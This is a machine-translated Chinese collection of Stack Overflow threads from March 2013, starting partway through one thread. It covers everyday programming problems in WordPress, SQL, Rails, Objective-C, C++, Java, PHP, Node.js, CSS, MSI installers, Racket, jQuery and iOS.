> 时间：2013-03-22T15:51:57.610

问题是您使用的是 2011 年 6 月的 CTP。该功能已经以 EntityFramework 5 和 Visual Studio 2012 的形式提供。请注意，您需要卸载 June CTP，否则它将破坏您的 VS2012 安装。有关更多详细信息，请参阅此[博客文章](http://blog.3d-logic.com/2012/04/11/entity-framework-zombie-a-k-a-microsoft-entity-framework-june-2011-ctp/)

# php - Wordpress 标志下奇怪的黑线

> ID：15562159
> 
> 赞同：0
> 
> 时间：2013-03-22T03:23:42.337
> 
> 标签：php, html, css, wordpress

我正在使用 Wordpress 建立自己的网站。当我使用 PNG 图片（140*82 像素）而不是默认的“站点标题”作为我的站点徽标时，我得到了一个非常奇怪的结果。图片呈现得很好，但图片下方有一条黑线。我检查了我的“header.php”和“style.css”文件，没有错。我还使用 Chrome “Inspector” 来检查徽标，上面写着：img 140*83( natural 140*82 )。

那么，这条线从何而来？多谢你们！

这是我在“header.php”中的徽标部分：

```
<<?php echo $heading_tag; ?> id="site-title">
    <span>
        <a href="<?php echo home_url( '/' ); ?>" title="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>.com" rel="home"> <img src="http://118.228.173.234/wp-content/uploads/logo.png" width = "140" height = "82"> </a>
    </span>
</<?php echo $heading_tag; ?>> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:07:50.233

那么它必须与CSS相关。检查您的 CSS 中是否引用了 span 并找到黑色的 #000 或 #000000。在这一点上没有看到更多代码很难说。还要检查 CSS 中的#site-title。

# sql - 不使用 min 创建 sql

> ID：15562162
> 
> 赞同：0
> 
> 时间：2013-03-22T03:24:19.890
> 
> 标签：sql, subquery, min

在 jennifer widom 的 dbclass 中，她举了一个例子，让一所大学与他们申请者的最高 gpa 配对.. sql 如下

```
select college.cname, state, gpa       
  from college, apply, student
 where college.cname = apply.cname
   and apply.sid = student.sid
   and gpa >= all (select gpa 
                     from student,apply
                    where student.sid = apply.sid
   and apply.cname = college.cname); 
```

我想知道如何创建查询以查找与申请人的**最低**gpa配对的大学

我知道这可以按如下方式完成

```
select college.cname, state, gpa       
  from college, apply, student
 where college.cname = apply.cname
   and apply.sid = student.sid
   and gpa = (select min(gpa) from student); 
```

但是我该怎么做，**而不使用 min**？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T03:29:30.447

```
select college.cname,state,gpa       
from college c
    join apply a On a.cname = c.cname 
    join student s On s.sid = apply.sid
where Not exists(select * from student 
                 Where gpa < s.gpa); 
```

# ruby-on-rails - Favicon 显示在本地的 Rails 上，而不是托管的应用程序上

> ID：15562173
> 
> 赞同：4
> 
> 时间：2013-03-22T03:25:12.397
> 
> 标签：ruby-on-rails, heroku, favicon

我把我的 favicon.ico 放在我的公用文件夹中，它显示在我的本地主机上，但是当我在互联网上查看它时，它却出现![其他网站图标](../Images/27685708c3fdcae220592790f849b6a6.png)了。我的应用程序通过 heroku 托管，域由 hover 提供。这是哪里失败了？

此外，如果这有帮助，这里是我用来呈现网站图标的代码：

```
<!DOCTYPE html>
<html>
  <head>
    <link rel="shortcut icon" href="/favicon.ico" />
    <title>Shoulak Predictions</title>
    <%= stylesheet_link_tag    'application', media: 'all' %>
    <%= javascript_include_tag 'application' %>
    <%= csrf_meta_tags %>
    <%= render 'layouts/shim' %>    
  </head>
  <body>
    <%= render 'layouts/header' %>
    <div class="container">
      <% flash.each do |key, value| %>
        <div class="alert alert-<%= key %>"><%= value %></div>
      <% end %>
      <%= yield %>
    </div>
    <div class="container">
        <%= render 'layouts/footer' %>
        <%= debug(params) if Rails.env.development? %>
    </div>
  </body>
</html> 
```

## 更新

如果我去`mydomain.com/favicon.ico`，我会下载我上传的网站图标。另外，如果我去`therealapp.herokuapps.com`，它会出现。我认为我的域名提供商可能会提供自己的域名？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-22T03:40:38.617

在您的 favicon 中添加一个随机数将强制更新：

```
<link rel="shortcut icon" href="/favicon.ico?v=2" /> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-07-25T14:56:25.050

一旦我清除了浏览器缓存，图标就会出现。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T03:26:35.197

我发现这种变化需要时间才能显现出来。与浏览器缓存或服务器设置或其他东西有关。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-23T00:34:31.437

我在做悬停转发，而不是使用 DNS 功能。Hover 会自动使用他们自己的网站图标。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-02-16T12:40:03.403

请检查另一个浏览器，它肯定会工作。反思需要时间。在我的工作代码下方。

```
<link rel="icon" type="image/png" href="../static/images/icon.png"/> 
```

# objective-c - 在 NSString 中定位特定的字符串片段

> ID：15562175
> 
> 赞同：0
> 
> 时间：2013-03-22T03:25:15.237
> 
> 标签：objective-c, nsstring

假设我有以下字符串：

`Mary had a little lamb, she also had a little sheep.`

我的目标是在句号前后提取每个单词`had`。（在这种情况下`a little sheep`）。

我试过这样：

```
- (NSInteger)indexOf:(NSString*)substring from:(NSInteger)starts {
    NSRange r;
    r.location = starts;
    r.length = [self length] - r.location;

    NSRange index = [self rangeOfString:substring options:NSLiteralSearch range:r];
    if (index.location == NSNotFound) {
        return -1;
    }
    return index.location + index.length;
} 
```

如：

`NSInteger sheepSpot = [string indexOf:@"had" from:23];`

```
// I know that I want to grab everything after the index of sheepSpot but before the period.
// Suppose now that I have an arbitrary number of periods in the sentence, how can I extract the above text without getting the wrong thing? 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:24:24.097

此代码将找到最后一个“had”和最后一个句点，并为您提供介于两者之间的所有内容：

```
NSString *text = @"Mary had a little lamb, she also had a little sheep.";
NSString *subtext = nil;
NSRange lastHadRange = [text rangeOfString:@"had" options:NSBackwardsSearch];
if (lastHadRange.location != NSNotFound) {
    NSRange lastPeriodRange = [text rangeOfString:@"." options:NSBackwardsSearch];
    if (lastPeriodRange.location != NSNotFound) {
        NSUInteger start = lastHadRange.location + lastHadRange.length;
        NSUInteger length = lastPeriodRange.location - start;
        subtext = [text substringWithRange:NSMakeRange(start, length)];
    }
}

NSLog(@"Subtext is: %@", subtext); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T03:49:38.883

试试这个：

```
-(NSRange)lastRangeOf:(NSString *)substring inString:(NSString *)string{
   return  [string rangeOfString:substring options:NSBackwardsSearch];
}

- (void)applicationDidFinishLaunching:(NSNotification *)aNotification{
    NSString *string=@"had Mary had a little lamb, she also had a had little sheep.";
    NSString *word=@"had";
    NSRange hadRange=[self lastRangeOf:word inString:string];
    NSInteger start=hadRange.location+word.length;
    NSInteger lengthToCut=string.length-start;
    NSString *substring=[string substringWithRange:NSMakeRange(start,lengthToCut)];
    NSLog(@"->%@",substring);
} 
```

# c++ - 字符串不输出我输入的字符

> ID：15562176
> 
> 赞同：0
> 
> 时间：2013-03-22T03:25:16.690
> 
> 标签：c++

所以这个程序应该输入我输入的东西，并以矩阵格式输出它们，这是我到目前为止的代码：

```
#include <iostream>
#include <string>

using namespace std;

#define N 6

//
// fill:
//
void fill(string s, int M[][N], int ROWS, int COLS)
{
int i, r, c;

for (i=0, r=0; r < ROWS; r++)
{
    for (c=0; c < COLS; c++)
    {
  M[r][c] = s[i];  // store ith character into matrix:

  i++;  // next character:
  if (i == s.length())  // start-over if that was last char:
    i = 0;
    }
}
 }

void print(int M[][N], int ROWS, int COLS)
{

string s;
getline(cin,s);
    int r, c;
for(r=0; r< ROWS; r++)
{
for(c=0; c < COLS; c++)
{

cout<<(char)M[r][c];

}

 cout <<endl; 
}
}
//
// main:
//
int main()
{
string s;
int  M[N][N];
int  M2[N][N];
int  row, col, ROWS, COLS;

ROWS = sizeof(M) / sizeof(M[0]);
COLS = sizeof(M[0]) / sizeof(M[0][0]);

fill(s, M, 1, 1);
print(M, ROWS, COLS);

return 0;
} 
```

知道为什么它输出随机字符而不是我输入的字符吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T03:36:14.677

首先，在将 string s 传递给 fill 函数之前，您没有对其进行初始化。接下来，您尝试将字符串插入到 int 中。C++ 不允许你直接这样做。

您是否尝试将诸如“123456”之类的字符串拆分为[1,2,3,4,5,6; 1,2,3,4,5,6;...] 等？这是你想让你的程序做的吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T06:46:36.773

尝试这个，

```
#include <iostream>
#include <string>

    using namespace std;

    #define N 6

    void fill(string s, char (&arr)[N][N])
    {
        int char_index =0;
        for (int i=0; i < N; i++)
        {
            for (int j=0; j < N; j++)
            {
                arr[i][j] = s.at(char_index);           
                if (char_index+1 == s.size()){
                    char_index =0;
                }else{
                    char_index++;
                }               
            }
        }   
    }

    void print(char arr[][N])
    {
        cout << "--------------" << endl;
        int char_index =0;
        for (int i=0; i < N; i++)
        {
            for (int j=0; j < N; j++)
            {
                cout << arr[i][j] << " ";
            }
            cout << endl;
        }
        cout << "--------------" << endl;

    }

    int main()
    {
        string s ="";
        cout << "Enter your string:";
        getline(cin,s); 
        char M[N][N];
        fill(s,M);
        print(M);
        system("pause");
        return 0;
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T04:00:55.413

在这里，您将输入存储在一个整数数组中并尝试显示字符值。

语句 cout<<(char)M[r][c] 将为您提供与 M[r][c] 的整数值相对应的 ASCII 值。

这可能是您看到的随机字符。您可以直接使用字符数组并尝试通过直接调用输出：cout<< M[r][c]

# android - 集成 Zxing 库 (android 2.2) 上的扫描仪缺陷

> ID：15562177
> 
> 赞同：0
> 
> 时间：2013-03-22T03:25:30.097
> 
> 标签：android, zxing

我已经成功地将 Zxing 2.1 源代码集成到我的 android 项目中。

调用此 onButtonScan() 后：

```
Intent intent = new Intent("com.google.zxing.client.android.SCAN");
intent.putExtra("com.google.zxing.client.android.SCAN.SCAN_MODE", "QR_CODE_MODE");
startActivityForResult(intent, 0); 
```

* * *

android 2.2（HTC sense）上显示的结果：

1.  扫描区域似乎很小，没有放在中间。
2.  扫描显示的是完全颠倒的。

android 4.1(S4) 上显示的结果：

1.  工作正常。

谁能想到出了什么问题？它的最低android版本必须> 2.2吗？

# java - java中的线程同步/生产者-消费者。重复打印数字 1-10 然后 10-1

> ID：15562181
> 
> 赞同：0
> 
> 时间：2013-03-22T03:25:57.550
> 
> 标签：java, exception, synchronization, producer-consumer

我对java非常陌生，发现了一个练习基本线程同步。问题是重复打印出 12345678910 10987654321 直到程序停止。应该使用十个不同的线程。

到目前为止，这是我的代码：我首先试图获得第一个数字（第一个工作），但它一直给我一个例外

```
public static void main(String[] args){
   threadOne one = new threadOne();
   one.start();
    }
}

class updateNumber{
    private int i;
    synchronized void increase(int s){
        this.i=s;
        System.out.println(i);
    }
 } 

class threadOne extends Thread {
    private updateNumber grab;
     public void run() {
        try{
         grab.increase(1);
        }
        catch(Exception e){
         System.out.println("error in thread one");
        }
    }
} 
```

我可能会以完全错误的方式解决这个问题，但我已经阅读了很多文档并且完全感到困惑。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-22T03:35:24.570

It looks like you didnt create a new instance of update

```
class threadOne extends Thread {
    private updateNumber grab;
     public void run() {
        try{
         grab.increase(1); // null pointer reference...<<<<<<<
        }
        catch(Exception e){
         System.out.println("error in thread one");
        }
    }
} 
```

// you need to alocate memory to updateNumber like this

```
//private updateNumber grab = new updateNumber();

    class threadOne extends Thread {
        private updateNumber grab = new updateNumber(); 
         public void run() {
            try{
             grab.increase(1); 
            }
            catch(Exception e){
             System.out.println("error in thread one");
            }
        }
    } 
```

# java - 如何设计数据驱动的 JUnit 测试类

> ID：15562184
> 
> 赞同：2
> 
> 时间：2013-03-22T03:26:16.447
> 
> 标签：java, junit, parameterized, data-driven-tests

```
@Parameters
public static Collection data() throws IOException {       
   ArrayList<String> lines = new ArrayList();

   URL url = PokerhandTestCase.class.getClassLoader().getResource("test/TestFile.txt");
   File testFile = new File(url.getFile());
   FileReader fileReader = new FileReader(testFile);
   bufReader = new BufferedReader(fileReader);
   assertFalse("Failed to load the test file.", testFile == null);

   boolean isEOF = false;
   while (!isEOF){

        String aline = bufReader.readLine();

        if (aline == null){
            System.out.println("Done processing.");
            isEOF = true;
        }

        lines.add(aline);   
   }

   return Arrays.asList(lines); 

 } 
```

程序的最后一行导致崩溃，我想知道从 arrayList 定义集合的正确方法是什么。这个函数需要 Collection 作为返回类型。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-22T03:30:04.843

用这个替换最后一行：

```
return (Collection)lines; 
```

由于 ArrayList 实现了 Collection 接口：[http ://docs.oracle.com/javase/6/docs/api/java/util/ArrayList.html](http://docs.oracle.com/javase/6/docs/api/java/util/ArrayList.html)

所以整体代码：

```
 public static Collection data() throws IOException 
  {
    ArrayList<String> lines = new ArrayList();
    // populate lines collection...
    return (Collection)lines;
  } 
```

根据下面的评论，也许这符合“数组集合”的条件：

```
 public static Collection data() throws IOException 
  {
    ArrayList<String> array1 = new ArrayList();
    ArrayList<String> array2 = new ArrayList();
    ArrayList<String> array3 = new ArrayList();
    // populate lines collection...
    ArrayList<ArrayList<String>> lines = new ArrayList();
    lines.add(array1);
    lines.add(array2);
    lines.add(array3);
    return (Collection)lines;
  } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T06:57:36.253

您要退回的收藏品必须是`Collection<Object[]>`. 您正在返回一个集合。你需要做这样的事情（一个完整的例子）：

```
@RunWith(Parameterized.class)
public class MyTest {
    @Parameters
    public static Collection<Object[]> data() throws IOException {
        List<Object[]> lines = new ArrayList<>();

        File testFile = new File("/temp/TestFile.txt");
        FileReader fileReader = new FileReader(testFile);
        BufferedReader bufReader = new BufferedReader(fileReader);
        Assert.assertFalse("Failed to load the test file.", testFile == null);

        boolean isEOF = false;
        while (!isEOF) {
            String aline = bufReader.readLine();

            if (aline == null) {
                System.out.println("Done processing.");
                isEOF = true;
            }

            lines.add(new Object[] { aline });
        }

        return lines;
    }

    private final String file;

    public MyTest(String file) {
        this.file = file;
    }

    @Test
    public void test() {
        System.out.println("file=" + file);
    }

} 
```

请注意，您没有在此处关闭文件，而是在列表末尾添加了一个无用的空值，但我复制了您的代码:-)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T04:02:10.667

> ArrayList 行 = new ArrayList(); ...返回 Arrays.asList(lines);

这返回二维数组。

> 这个函数需要 Collection 作为返回类型。

我认为 user1697575 的回答是正确的。

# php - 在函数 PHP 中使用 include

> ID：15562185
> 
> 赞同：0
> 
> 时间：2013-03-22T03:26:18.357
> 
> 标签：php, file, function, include

我的问题是每次包含文件时都需要执行一个函数。

但我知道，如果我在函数中使用 include，它会搞砸的。

那么有没有办法改变include函数来执行里面的函数呢？或者创建一个如果我使用包含就会触发的“侦听器”？

例子：

```
function include_file($path){

    if($this->error)
         echo $this->error_msg;

    include_once($path);

} 
```

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T03:37:30.980

> 但我知道，如果我在函数中使用 include，它会搞砸的。

恕我直言，它不会搞砸的。

**包括_file.php**

```
<?php

include_once ("included_file.php");
echo $test;
?> 
```

**包含文件.php**

```
<?php

function myFunction()
{
return "Testing 123";
}

$test=myFunction();

?> 
```

每次包含此文件时，这将调用 myFunction。除非我误解了这个问题，否则这听起来很微不足道

# utf-8 - 如何将 utf8 有符号字符串转换为无符号字符串或 char[]（在 Java 中）

> ID：15562186
> 
> 赞同：0
> 
> 时间：2013-03-22T03:26:18.903
> 
> 标签：utf-8, char

我有一个这样的签名字符串：“Làm sao để chuyển chuổi có dấu về không dấu?”

我想把它翻译成这样的字符串：“Lam sao de chuyen chuoi co dau ve khong dau?”

请告诉我用Java代码解决它的方法。非常感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T09:05:26.387

就像是

```
public static void main(String args[]) {
    String src = "Làm sao để chuyển chuổi có dấu về không dấu?";

    String dest = Normalizer.normalize(src, Normalizer.Form.NFD);
    dest = dest.replaceAll("[^\\p{ASCII}]", "");

    System.out.println(src);
    System.out.println(dest);
} 
```

给你

Làm sao để chuyển chuổi có dấu về không dấu?

Lam sao e chuyen chuoi co dau ve khong dau?

# javascript - 在 Node.js 中将信息存储在数组中

> ID：15562196
> 
> 赞同：-1
> 
> 时间：2013-03-22T03:26:59.353
> 
> 标签：javascript, node.js, express

我正在使用 Node.js，我需要存储一些信息。如果我使用 JavaScript 数组来执行此操作，那会是永久性的，还是如果服务器停止，数组会消失？服务器是否曾经停止与 Node.js 循环？抱歉，我是初学者，不完全确定 node.js 是如何工作的 .. 感谢您的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T03:30:50.877

如果服务器停止，它将消失。如果您需要持久化数据，请将其存储在数据库中或序列化到磁盘上的文件中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-08T05:22:23.220

在启动 redis 集群之前，我已经在启动项目中这样做了几次以存储会话令牌信息。

虽然非持久性数据可能是一个问题，但它并不总是会破坏交易（想想缓存）。两个更大的问题是：

1) 适用于当您的应用程序在多个实例上平衡时的生产环境。您的用户可能不会访问同一台服务器，并且您的 javascript 数组将不匹配。

2）不断增长的可变数组可能会使您的节点应用程序/服务器崩溃。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T03:32:18.340

服务器停止时阵列将消失。

只要有待处理的回调或打开的侦听器，服务器就会一直循环，因此 Web 服务器永远不会停止循环。

我建议您将信息存储在数据库中。

# center - 在响应式网站上居中徽标

> ID：15562201
> 
> 赞同：1
> 
> 时间：2013-03-22T03:27:33.997
> 
> 标签：center

我希望徽标和图像滑块以我的响应式网站为中心。

基本上，徽标和滑块在全尺寸屏幕上彼此相邻。当站点不够宽并且徽标缩小时，我可以使幻灯片消失。

我想要做的是使徽标和滑块中心一旦它们不再彼此相邻。

请帮助：[http ://ranchocordovaeventscenter.com/](http://ranchocordovaeventscenter.com/)

谢谢，

马特

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-23T05:40:59.127

将 logo 和滑块放在一个 div 中，并给它一个固定的宽度。如果此 div 具有#inner id，则解决方案将是：

```
#inner {
width:1000px;
display:block;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T03:42:12.497

`hgroup`您可以通过设置标签`margin: 0 auto;text-align:center`的子元素居中`hgroup`

这将导致内容在该 div 中居中

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-05-19T20:28:41.953

给定的答案只有在您同时使用它们时才有效，以 margin: 0 auto 为中心；仅在指定宽度时才有效，并且仅将 div 显示为块不会改变外观。试试css：

```
div {
  width: 500px;
  margin: 0 auto;  } 
```

与其他样式一起，它应该居中

# windows-installer - 如何将先决条件编码到 MSI 中？

> ID：15562207
> 
> 赞同：3
> 
> 时间：2013-03-22T03:27:52.920
> 
> 标签：windows-installer, prerequisites

是否可以将先决条件编码为`MSI`?

例如。如果我还需要安装我的`MSI`包等，是否有可能`Java JRE`知道这些其他安装也是必需的？`.NET 3.5``MSI`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T04:08:50.850

您将需要使用引导程序/链接器来安装先决条件。WiX 工具集带有一个非常强大的引导程序/链接器，称为 Burn。您可以通过`Bundle`元素访问它。

# list - 在 Racket 中循环列表构造

> ID：15562213
> 
> 赞同：0
> 
> 时间：2013-03-22T03:28:32.593
> 
> 标签：list, loops, racket

我是 Racket 的新手，正在尝试为我的编程语言课程编写 Mastermind 游戏。我已经完成了代码，它也运行了。在下面的代码中，“解决方案”是 4 种随机生成的颜色的列表。我想问如何修改我的“constructSolution”函数，以便我可以运行循环/递归而不是编写集合！4个不同的时间。我尝试像这样修改constructSolution函数：

```
 (define i 0)
(define (constructSolution)
  (cond
    ((if (< i 4)
         (set! solution (append solution (list (random-color))))
         (set! i (+ i 1))))
    (else #f))
) 
```

但它没有用。理想情况下，用户将输入列表的长度，该函数将检查“（如果（< i 长度））”而不是“（如果（< i 4））”。任何帮助，将不胜感激。这是我的代码：

```
 #lang racket
(require racket/gui/base)

(define solution1 '(yellow red black blue))
(define solution '())
(define blackPegs 0)
(define totalPegs 0)
(define whitePegs 0)
(define countPegs 0)
(define numBlackPegs 0)
(define guessText "")
(define displayGuess "Guess ")
(define displayScore "Black Pegs = ")
(define displaySolution "Solution: ")
(define numGuess 1)

(define f (new frame% [label "Mastermind"]
                      [width 300]
                      [height 500]
                      [alignment '(center center)]))
(send f show #t)
(define c (new editor-canvas% [parent f]))
(define t (new text%))
(send c set-editor t)
(send t insert "Welcome to Mastermind!\n\n")

(define (constructSolution)
  (set! solution (append solution (list (random-color))))
  (set! solution (append solution (list (random-color))))
  (set! solution (append solution (list (random-color))))
  (set! solution (append solution (list (random-color))))
)

(define (random-color)
  (choose '(red blue green yellow orange purple black)))

(define (choose xs)
  (list-ref xs (random (length xs))))

(define (alist->string alst)
  (string-join (map symbol->string alst) " "))

(constructSolution)
(set! displaySolution (string-append displaySolution (alist->string solution)))
(send t insert displaySolution)
(send t insert "\n\n")

(define (try guess)
  (compareBlackPegs guess solution blackPegs)
  (printf "(~a, " numBlackPegs)
  (compareWhitePegs guess solution)
  (printf "~a) ~n" whitePegs)
  (set! guessText (alist->string guess))
  (set! totalPegs 0)
  (set! displayGuess (string-append displayGuess (number->string numGuess)))
  (set! displayGuess (string-append displayGuess ": "))
  (set! displayGuess (string-append displayGuess guessText))
  (set! displayGuess (string-append displayGuess "\n"))
  (send t insert displayGuess)
  (set! displayGuess "Guess ")
  (set! displayScore (string-append displayScore (number->string numBlackPegs)))
  (set! displayScore (string-append displayScore ", White Pegs = "))
  (set! displayScore (string-append displayScore (number->string whitePegs)))
  (set! displayScore (string-append displayScore "\n\n"))
  (send t insert displayScore)
  (set! displayScore "Black Pegs = ")
  (set! numGuess (+ numGuess 1))
)

(define (compareBlackPegs guess solution blackPegs)
  (if (null? guess) (set! numBlackPegs blackPegs)
      (if (equal? (car guess) (car solution)) (compareBlackPegs (cdr guess) (cdr solution) (+ blackPegs 1))
          (compareBlackPegs (cdr guess) (cdr solution) blackPegs)))
)

(define (compareWhitePegs guess solution)
  (cond ((null? solution) 
         (set! whitePegs (- totalPegs numBlackPegs)))
         ;(printf "~a) ~n" totalPegs))
        (else
         (let ((a (count (car solution) guess countPegs))
               (b (count (car solution) solution countPegs)))
         (if (equal? (< a b) #t) (set! totalPegs (+ totalPegs a))
             (set! totalPegs (+ totalPegs b))))
         (compareWhitePegs guess (cdr solution))))
)

(define (count x alist countPegs)
  (if (null? alist) countPegs
      (if (equal? x (car alist)) (count x (cdr alist) (+ countPegs 1))
          (count x (cdr alist) countPegs)))
)

(try '(red red red red))
(try '(red yellow yellow yellow))
(try '(yellow red green green))
(try '(yellow red blue blue))
(try '(yellow red blue white))
(try '(yellow red black blue))
(send t insert "\nGoodbye!\n") 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T04:41:38.633

Please avoid using `set!` for implementing a loop in Scheme, that's not the way to go - use recursion or the built-in [looping constructs](http://docs.racket-lang.org/guide/for.html). If you want to repeat a function call a fixed number of times (say, 4) here's an example of how to do it using explicit recursion:

```
(define (repeat f n)
  (cond ((zero? n) 'done)
        (else (f)
              (repeat f (sub1 n))))) 
```

The above will call `f` a given number of times. If necessary modify it to pass additional parameters to `f`. For example:

```
(repeat (lambda () (display 'xo)) 4)
=> xoxoxoxo
   'done 
```

# jquery - jquery每个循环不打印文本

> ID：15562215
> 
> 赞同：-1
> 
> 时间：2013-03-22T03:28:56.380
> 
> 标签：jquery

```
$.each( headings, function() {
      $('#heading').append($("<option />",{ value: this, text: this }));
}); 
```

html 验证器显示了这一点

```
<option value="abc"></option>
<option value="xyz"></option>
</select> 
```

该选项的文本未打印。如果我使用哈希它可以正常工作

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T03:33:37.370

```
$.each( headings, function() {
      $('#heading').append($("<option value="+this+">"+this+"</option>"));
}); 
```

# ios - iOS：处理多维 Plist

> ID：15562226
> 
> 赞同：0
> 
> 时间：2013-03-22T03:30:02.110
> 
> 标签：ios, dictionary, plist

我正在尝试一个可以读取和写入多维 Plist 文件的应用程序。请考虑以下 Plist。

```
**Key                      Type             Value**
Root                     Dictionary
   Section1              Dictionary
       Subsection1       Dictionary
           Field-1.1     String           Field-1.1's Value
           Field-1.2     String           Field-1.2's Value
       Subsection11      Dictionary
           Field-11.1    String           Field-11.1's Value
           Field-11.2    String           Field-11.2's Value
       Etc.

   Section2              Dictionary
       Subsection2       Dictionary
           Field-2.1     String           Field-2.1's Value
           Field-2.2     String           Field-2.2's Value
       Etc.
   Section3              Dictionary
   ...
   ...
   ... 
```

现在，我的第一个视图有一个表格视图。第一个视图应该只显示主要部分 - Section1、Section2、Section3 等。

*   当我点击 Section1 单元格时，然后在下一个视图中，应显示该主要部分的子部分 - Subsection1、Subsection11 等。

    当我点击 Section2 单元格时，然后在下一个视图中，应该显示这个主要部分 2 的子部分 - Subsection2 等。

我能够显示主要部分。但我不知道如何达到小节的水平。

请帮忙

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T05:08:38.470

Chandu虽然很简单。我确定您已经阅读了字典中的 plist，并且您已经使用 NSDictionary 的 allkeys 方法生成了 tableview。现在，当用户选择其中一个部分时，您必须将该特定部分的字典传递给下一个视图控制器（可能使用自定义初始化程序或适合您的应用程序设计的任何其他方法）。在下一个视图控制器中，您必须编写相同的逻辑（与第一个视图控制器相同）来显示所有小节。希望这可以帮助。

# list - 在重复调用 Racket 中的函数后保持相同的列表

> ID：15562231
> 
> 赞同：0
> 
> 时间：2013-03-22T03:30:42.430
> 
> 标签：list, scheme, racket

我正在使用 Racket，我想做的是开发一个给定元素的随机列表，这些元素也具有给定的长度。我知道如何创建列表，但我遇到的问题是我不知道如何在每次从命令行使用列表调用函数时保持相同的列表，而无需重新创建不同的列表因为列表由随机选择的元素组成。这就是我所拥有的：

```
(define gameColors '(red green blue yellow black))
(define currentGameList '())
(define input 4)
(define randomNumber (random 5))

(if (equal? randomNumber 0)
  (if (< (length currentGameList) (+ input 1))
      (set! currentGameList (append currentGameList (list (car gameColors))))
      ;;otherwise
      (set! currentGameList currentGameList))
  ;;otherwise
  (set! currentGameList currentGameList)) 
```

然后 if 块为 randomNumber 的每个不同的可能结果重复。我只需要知道如何从使用 currentGameList 的命令行重复调用我的guess 函数，而无需我的程序每次都重新创建 currentGameList。guess 函数还具有必须由用户输入的参数，因此每次都必须在命令行中输入。任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:22:10.547

第一件事：避免使用`set!`. 在另一种编程语言中，您会使用变量的变异来解决问题，但这不是 Scheme 的方式。问题中的代码不起作用，它上面没有任何东西在颜色列表上进行迭代或重复，并且`gameColors`每次只选择第一个元素（它没有任何随机性）。如果我理解了这个问题（这有点令人困惑），这就是您的目标：

```
(define (generate-random lst len)
  (for/list ([x (in-range len)])
    (list-ref lst (random (length lst)))))

(generate-random '(red green blue yellow black) 4)
=> '(black black blue green) ; one possible output 
```

当然，如果您需要保存由一次调用生成的特定列表`generate-random`（因为每次结果都会不同），只需将该列表存储在变量中以供将来使用：

```
(define currentGameList (generate-random '(red green blue yellow black) 4)) 
```

# eclipse - 跟踪 Eclipse 插件类调用

> ID：15562233
> 
> 赞同：0
> 
> 时间：2013-03-22T03:31:01.783
> 
> 标签：eclipse, eclipse-plugin

我有一个 Eclipse 插件（代码也可用），它通过单击“排列”按钮自动排列图形组件。我怎样才能看到这个插件完成的排列过程的底层类调用。谢谢

# ruby-on-rails - 在 Windows 上运行“捆绑安装”时出错

> ID：15562237
> 
> 赞同：0
> 
> 时间：2013-03-22T03:31:31.983
> 
> 标签：ruby-on-rails, ssl, bundler, ruby-1.9.3

运行时出现此错误`bundle install`，我使用的是 Ruby 1.9.3

```
 Fetching source index for https://rubygems.org/ 
```

> C:/RailsInstaller/Ruby1.9.3/lib/ruby/1.9.1/net/http.rb:799:in`connect': SSL_connect SYSCALL returned=5 errno=0 stat v3 read server hello A (OpenSSL::SSL::SSLError) from C:/RailsInstaller/Ruby1.9.3/lib/ruby/1.9.1/net/http.rb:799:in`块从 C:/RailsInstaller/Ruby1.9.3/lib/ruby/1.9.1/timeout.rb 连接:54:in `timeout' from C:/RailsInstaller/Ruby1.9.3/lib/ruby/1.9.1/timeout.rb:99:in`timeout' 来自 C:/RailsInstaller/Ruby1.9.3/lib/ruby/1.9.1/net/http.rb:799:in `connect' from C:/RailsInstaller/Ruby1.9.3/lib/ruby/1.9.1/net/http.rb:755:in`do_start' 来自 C:/RailsInstaller/Ruby1.9.3/lib/ruby/1.9 .1/net/http.rb:750:in connection_for' 来自 C:/RailsInstaller/Ruby1.9.3/lib/ruby/site_ruby/1.9.1/rubygems/remote_fetcher.rb:368:in fetch_http' 来自 C:/RailsInstaller /Ruby1.9.3/lib/ruby/site_ruby/1.9.1/rubygems/remote_fetcher.rb:231:in load_specs' 来自 C:/RailsInstaller/Ruby1.9.3/lib/ruby/site_ruby/1.9.1/rubygems/spec_fetcher。 RB：231：在`start' from
